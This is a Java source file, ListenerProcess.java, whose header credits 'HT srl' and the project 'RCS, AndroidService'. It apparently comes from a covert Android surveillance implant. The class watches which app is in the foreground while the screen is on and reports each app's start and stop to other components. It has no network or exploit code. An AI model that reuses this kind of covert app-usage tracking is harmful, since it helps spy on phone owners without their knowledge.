/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.listener;

import java.util.ArrayList;
import java.util.TreeMap;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.RunningProcesses;
import com.android.dvci.Standby;
import com.android.dvci.auto.Cfg;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;

public class ListenerProcess extends Listener<ProcessInfo> implements Observer<Standby> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerProcess"; //$NON-NLS-1$

	private BroadcastMonitorProcess processReceiver;
	//TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
	//TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();
	//String currentForeground;
	String lastForeground = "";

	private boolean started;

	private Object standbyLock = new Object();
	private Object startedLock = new Object();

	/** The singleton. */
	private volatile static ListenerProcess singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerProcess self() {
		if (singleton == null) {
			synchronized (ListenerProcess.class) {
				if (singleton == null) {
					singleton = new ListenerProcess();
				}
			}
		}
		
		return singleton;
	}

	public ListenerProcess() {
		super();
		
		synchronized (standbyLock) {
			ListenerStandby.self().attach(this);
			setSuspended(!ListenerStandby.isScreenOn());
		}
	}

	@Override
	protected void start() {

		synchronized (startedLock) {
			if (!started) {
				if (ListenerStandby.isScreenOn()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start)");
					}
					
					started = true;

					processReceiver = new BroadcastMonitorProcess();
					processReceiver.start();
					processReceiver.register(this);
					
					//dispatch(new ProcessInfo("", ProcessStatus.START));
				}else{
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start): screen off");
						setSuspended(true);
					}
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start): already started");
				}
			}
		}

	}

	@Override
	protected void stop() {
		synchronized (startedLock) {
			if (started) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop)");
				}
				
				started = false;
				
				if (processReceiver != null) {
					//dispatch(new ProcessInfo("", ProcessStatus.STOP));
					processReceiver.unregister();
					processReceiver = null;
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop): already stopped");
				}
			}
		}

	}
	
	public synchronized boolean isRunning(String appName){
		return lastForeground.equals(appName);
	}

	protected synchronized int dispatch(String currentForeground) {
	
		if(!currentForeground.equals(lastForeground)){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): started " + currentForeground);//$NON-NLS-1$
			}
			dispatch(new ProcessInfo(currentForeground, ProcessStatus.START));
			if(!StringUtils.isEmpty(lastForeground)){
				super.dispatch(new ProcessInfo(lastForeground, ProcessStatus.STOP));
			}
			lastForeground = currentForeground;
		}

		return 0;
	}

	@Override
	public int notification(Standby b) {

		synchronized (standbyLock) {
			if (b.getStatus()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): try to resume");
				}
				
				resume();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): try to suspend");
				}
				
				suspend();
			}
		}

		return 0;
	}

}
